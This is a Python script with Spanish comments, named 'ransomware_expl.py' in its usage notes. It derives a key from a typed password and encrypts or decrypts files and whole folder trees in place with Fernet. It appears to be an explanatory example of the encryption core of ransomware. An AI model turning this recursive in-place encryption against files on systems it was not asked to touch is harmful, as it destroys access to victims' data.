#1. Importaciones:
import argparse         # Para procesar argumentos de línea de comandos.
import pathlib          # Para manipulación de rutas de archivos y directorios.
import secrets          # Para generar bytes aleatorios de manera segura.
import os               # Para operaciones del sistema operativo.
import base64           # Para codificación y decodificación Base64.
import getpass          # Para solicitar contraseñas de manera segura.
import cryptography     # Para operaciones criptográficas.
from cryptography.fernet import Fernet          # Una implementación del cifrado de Fernet basado en AES.
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt            #Un algoritmo de derivación de clave para derivar una clave secreta a partir de una contraseña y una sal.

#2. Funciones para Generar y Derivar Claves:
def generate_salt(size=16):             #Genera una sal aleatoria de tamaño especificado.
    # Genera la sal utilizada para la derivación de la clave, `size` es la longitud de la sal a generar
    return secrets.token_bytes(size)

def derive_key(salt, password):         # Deriva la clave utilizando el algoritmo Scrypt.
    # Deriva la clave de la `password` utilizando la `salt` proporcionada
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())

# 3. Funciones para Cargar y Generar Claves:
def load_salt():
    # Carga la sal desde el archivo "salt.salt"
    return open("salt.salt", "rb").read()

def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    # Genera una clave a partir de una `password` y la sal.
    # Si `load_existing_salt` es True, carga la sal desde un archivo llamado "salt.salt".
    # Si `save_salt` es True, genera una nueva sal y la guarda en "salt.salt"
    # Devuelve la clave codificada en Base64

    if load_existing_salt:
        # Carga una sal existente
        salt = load_salt()
    elif save_salt:
        # Genera una nueva sal y la guarda
        salt = generate_salt(salt_size)
        with open("salt.salt", "wb") as salt_file:
            salt_file.write(salt)
    # Genera la clave a partir de la sal y la contraseña
    derived_key = derive_key(salt, password)
    # Codifica la clave en Base64 y la devuelve
    return base64.urlsafe_b64encode(derived_key)


# 4. Funciones para Cifrar y Descifrar Archivos y Carpetas:
def encrypt(filename, key):
    # Dado un nombre de archivo (str) y una clave (bytes), cifra el archivo y lo escribe
    f = Fernet(key)
    with open(filename, "rb") as file:
        # Lee todos los datos del archivo
        file_data = file.read()
    # Cifra los datos
    encrypted_data = f.encrypt(file_data)
    # Escribe el archivo cifrado
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def encrypt_folder(foldername, key):
    # Si es una carpeta, cifra toda la carpeta (es decir, todos los archivos contenidos)
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Cifrando {child}")
            # Cifra el archivo
            encrypt(child, key)
        elif child.is_dir():
            # Si es una carpeta, cifra toda la carpeta llamando a esta función de manera recursiva
            encrypt_folder(child, key)

def decrypt(filename, key):
    # Dado un nombre de archivo (str) y una clave (bytes), descifra el archivo y lo escribe
    f = Fernet(key)
    with open(filename, "rb") as file:
        # Lee los datos cifrados
        encrypted_data = file.read()
    # Descifra los datos
    try:
        decrypted_data = f.decrypt(encrypted_data)
    except cryptography.fernet.InvalidToken:
        print("[!] Token no válido, probablemente la contraseña es incorrecta")
        return
    # Escribe el archivo original
    with open(filename, "wb") as file:
        file.write(decrypted_data)

def decrypt_folder(foldername, key):
    # Si es una carpeta, descifra toda la carpeta
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Descifrando {child}")
            # Descifra el archivo
            decrypt(child, key)
        elif child.is_dir():
            # Si es una carpeta, descifra toda la carpeta llamando a esta función de manera recursiva
            decrypt_folder(child, key)

# 5. Bloque Principal y Argumentos de Línea de Comandos:
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script de cifrado de archivos con contraseña")
    parser.add_argument("path", help="Ruta para cifrar / descifrar, puede ser un archivo o una carpeta entera")
    parser.add_argument("-s", "--salt-size", help="Si se establece, se genera una nueva sal con el tamaño especificado", type=int)
    parser.add_argument("-e", "--encrypt", action="store_true", help="Si se establece, cifra el archivo/carpeta, solo se puede especificar -e o -d.")
    parser.add_argument("-d", "--decrypt", action="store_true", help="Si se establece, descifra el archivo/carpeta, solo se puede especificar -e o -d.")

    # Analiza los argumentos
    args = parser.parse_args()

    # Obtiene la contraseña
    if args.encrypt:
        password = getpass.getpass("Ingrese la contraseña para cifrar: ")
    elif args.decrypt:
        password = getpass.getpass("Ingrese la contraseña que utilizó para cifrar: ")

    # Genera la clave
    if args.salt_size:
        key = generate_key(password, salt_size=args.salt_size, save_salt=True)
    else:
        key = generate_key(password, load_existing_salt=True)

    # Obtiene las banderas de cifrado y descifrado
    encrypt_ = args.encrypt
    decrypt_ = args.decrypt

    # Verifica si se especifican tanto el cifrado como el descifrado
    if encrypt_ and decrypt_:
        raise TypeError("Por favor, especifique si desea cifrar o descifrar el archivo.")
    elif encrypt_:
        if os.path.isfile(args.path):
            # Si es un archivo, lo cifra
            encrypt(args.path, key)
        elif os.path.isdir(args.path):
            encrypt_folder(args.path, key)
    elif decrypt_:
        if os.path.isfile(args.path):
            decrypt(args.path, key)
        elif os.path.isdir(args.path):
            decrypt_folder(args.path, key)
    else:
        raise TypeError("Por favor, especifique si desea cifrar o descifrar el archivo.")

"""
-Utiliza el módulo argparse para procesar argumentos de línea de comandos.
-Solicita la contraseña de manera segura.
-Genera o carga la clave dependiendo de si se especifica un tamaño de sal o se desea cargar una sal existente.
-Realiza operaciones de cifrado o descifrado según las opciones proporcionadas en la línea de comandos.

Este script permite cifrar y descifrar archivos y carpetas de manera segura utilizando AES con una contraseña. 
Sin embargo, ten en cuenta que la seguridad de la implementación dependerá de cómo se gestione la contraseña y la sal. 
Además, el script asume que el usuario recordará la contraseña utilizada para cifrar un archivo para poder descifrarlo posteriormente.

Encrypt: python ransomware_expl.py -e /path/to/your/file_or_folder
Decrypt: python ransomware_expl.py -d /path/to/your/encrypted_file_or_folder
"""